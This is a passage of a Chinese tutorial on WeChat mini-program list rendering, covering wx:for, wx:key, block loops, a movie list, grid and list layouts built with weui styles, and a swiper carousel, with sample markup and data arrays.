href="#0x001-渲染数组里的所有数据" class="headerlink" title="0x001 渲染数组里的所有数据"></a>0x001 渲染数组里的所有数据</h3><p><strong>相同的结构是列表渲染的前提</strong></p><p>在实际的开发场景里，商品、新闻、股票、收藏、书架列表等都会有几千上万条的数据，他们都有一个共同的特征就是数据的结构相同，这也是可以批量化渲染的前提。</p><p>Eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">newstitle</span>:[</span><br><span class="line">      <span class="string">&quot;瑞幸咖啡：有望在三季度达到门店运营的盈亏平衡点&quot;</span>,</span><br><span class="line">      <span class="string">&quot;腾讯：广告高库存量还是会持续到下一年&quot;</span>,</span><br><span class="line">      <span class="string">&quot;上汽集团云计算数据中心落户郑州，总投资20亿元&quot;</span>,</span><br><span class="line">      <span class="string">&quot;京东：月收入超2万元快递小哥数量同比增长163%&quot;</span>,</span><br><span class="line">      <span class="string">&quot;腾讯：《和平精英》日活跃用户已超五千万&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>将上述数据全部渲染出来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;newstitle&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;item&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里wx:for&#x3D;””，也就是在数组newstitle里进行循环，*this代表在 for 循环中的 item 本身，而的item是默认的。也可以使用如下方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for-items</span>=<span class="string">&quot;&#123;&#123;newstitle&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;title&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x002-wx-for"><a href="#0x002-wx-for" class="headerlink" title="0x002 wx:for"></a>0x002 wx:for</h3><p>在组件上使用 <code>wx:for</code> 控制属性绑定一个数组，即可使用数组中各项的数据重复渲染该组件。</p><p>默认数组的当前项的下标变量名默认为 <code>index</code>，数组当前项的变量名默认为 <code>item</code></p><p>使用 <code>wx:for-item</code> 可以指定数组当前元素的变量名，</p><p>使用 <code>wx:for-index</code> 可以指定数组当前下标的变量名：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;array&#125;&#125;&quot;</span> <span class="attr">wx:for-index</span>=<span class="string">&quot;idx&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;itemName&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;idx&#125;&#125;: &#123;&#123;itemName.message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>wx:for</code> 也可以嵌套，下边是一个九九乘法表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;i&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;j&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;i &lt;= j&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;i&#125;&#125; * &#123;&#123;j&#125;&#125; = &#123;&#123;i * j&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-block-wx-for"><a href="#0x003-block-wx-for" class="headerlink" title="0x003 block wx:for"></a>0x003 block wx:for</h3><p>类似 <code>block wx:if</code>，也可以将 <code>wx:for</code> 用在&#96;&#96;标签上，以渲染一个包含多节点的结构块。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3]&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123;index&#125;&#125;: <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123;item&#125;&#125; <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-wx-key"><a href="#0x004-wx-key" class="headerlink" title="0x004 wx:key"></a>0x004 wx:key</h3><p>如果列表中项目的位置会动态改变或者有新的项目添加到列表中，并且希望列表中的项目保持自己的特征和状态（如 <a href="https://developers.weixin.qq.com/miniprogram/dev/component/input.html">input</a> 中的输入内容，<a href="https://developers.weixin.qq.com/miniprogram/dev/component/switch.html">switch</a> 的选中状态），需要使用 <code>wx:key</code> 来指定列表中项目的唯一的标识符。</p><p><code>wx:key</code> 的值以两种形式提供</p><ol><li>字符串，代表在 for 循环的 array 中 item 的某个 property，该 property 的值需要是列表中唯一的字符串或数字，且不能动态改变。</li><li>保留关键字 <code>*this</code> 代表在 for 循环中的 item 本身，这种表示需要 item 本身是一个唯一的字符串或者数字。</li></ol><p>当数据改变触发渲染层重新渲染的时候，会校正带有 key 的组件，框架会确保他们被重新排序，而不是重新创建，以确保使组件保持自身的状态，并且提高列表渲染时的效率。</p><p><strong>如不提供 <code>wx:key</code>，会报一个 <code>warning</code>， 如果明确知道该列表是静态，或者不必关注其顺序，可以选择忽略。</strong></p><h3 id="0x005-电影列表页面"><a href="#0x005-电影列表页面" class="headerlink" title="0x005 电影列表页面"></a>0x005 电影列表页面</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">movies</span>: [&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>, </span><br><span class="line">    <span class="attr">img</span>:<span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">    <span class="attr">desc</span>:<span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span>&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;这个杀手不太冷&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p511118051.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;怪蜀黍和小萝莉不得不说的故事。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;阿甘正传&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img1.doubanio.com/view/photo/s_ratio_poster/public/p510876377.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;一部美国近现代史。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;美丽人生&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p510861873.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;最美的谎言。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;泰坦尼克号&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p457760035.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;失去的才是永恒的。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;千与千寻&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1606727862.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;最好的宫崎骏，最好的久石让。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;辛德勒名单&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p492406163.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;拯救一个人，就是拯救整个世界。&quot;</span></span><br><span class="line">    &#125;,     </span><br><span class="line">  ],</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page__bd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-panel weui-panel_access&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-panel__bd&quot;</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;movies&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;movies&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*item&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box weui-media-box_appmsg&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-cell_active&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__hd weui-media-box__hd_in-appmsg&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__thumb&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movies.img&#125;&#125;&quot;</span> <span class="attr">sytle</span>=<span class="string">&quot;height:auto&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__bd weui-media-box__bd_in-appmsg&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__title&quot;</span>&gt;</span>&#123;&#123;movies.name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__desc&quot;</span>&gt;</span>&#123;&#123;movies.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x006-Grid九宫格样式参考-适用于界面"><a href="#0x006-Grid九宫格样式参考-适用于界面" class="headerlink" title="0x006 Grid九宫格样式参考(适用于界面)"></a>0x006 Grid九宫格样式参考(适用于界面)</h3><p>一行三列式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page__bd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-grids&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;grids&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;grid&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-grid_active&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid__icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;grid.imgurl&#125;&#125;&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid__label&quot;</span>&gt;</span>&#123;&#123;grid.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;block&gt;</code>的标签，这个标签主要是说明里面包含的是一个多节点的结构块，换成<code>&lt;view&gt;</code>组件也没有太大影响</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">grids</span>:[</span><br><span class="line">      &#123; <span class="attr">imgurl</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon1.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>:<span class="string">&quot;招聘&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon2.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;房产&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon3.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;二手车新车&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon4.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;二手&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon5.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;招商加盟&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon6.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;兼职&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon7.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;本地&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon8.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;家政&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon9.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;金币夺宝&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon10.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;送现金&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>一行五列式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.weui-grid</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">20%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x007-List样式参考-适用于个人中心"><a href="#0x007-List样式参考-适用于个人中心" class="headerlink" title="0x007 List样式参考(适用于个人中心)"></a>0x007 List样式参考(适用于个人中心)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cells weui-cells_after-title&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;listicons&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;listicons&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell weui-cell_access&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-cell_active&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__hd&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;listicons.icon&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-right: 5px;vertical-align: middle;width:20px; height: 20px;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__bd&quot;</span>&gt;</span>&#123;&#123;listicons.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__ft weui-cell__ft_in-access&quot;</span>&gt;</span>&#123;&#123;listicons.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">listicons</span>:[&#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons1.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的文件&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons2.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的收藏&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;收藏列表&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons3.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的邮件&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><h2 id="0x07-小程序组件"><a href="#0x07-小程序组件" class="headerlink" title="0x07 小程序组件"></a>0x07 小程序组件</h2><h3 id="0x001-轮播效果"><a href="#0x001-轮播效果" class="headerlink" title="0x001 轮播效果"></a>0x001 轮播效果</h3><p>需要用到的轮播组件swiper</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;home-top&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;home-swiper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">indicator-dots</span>=<span class="string">&quot;&#123;&#123;indicatorDots&#125;&#125;&quot;</span> <span class="attr">autoplay</span>=<span class="string">&quot;&#123;&#123;autoplay&#125;&#125;&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;&#123;&#123;interval&#125;&#125;&quot;</span> <span class="attr">duration</span>=<span class="string">&quot;&#123;&#123;duration&#125;&#125;&quot;</span> <span class="attr">indicator-color</span>=<span class="string">&quot;&#123;&#123;indicatorColor&#125;&#125;&quot;</span> <span class="attr">indicator-active-color</span>=<span class="string">&quot;&#123;&#123;activecolor&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;imgUrls&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;item&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;height:200px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;slide-image&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span>  /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imgUrls</span>: [</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551334787-21e6bd3ab135?w=640&#x27;</span>,</span><br><span class="line">  <span 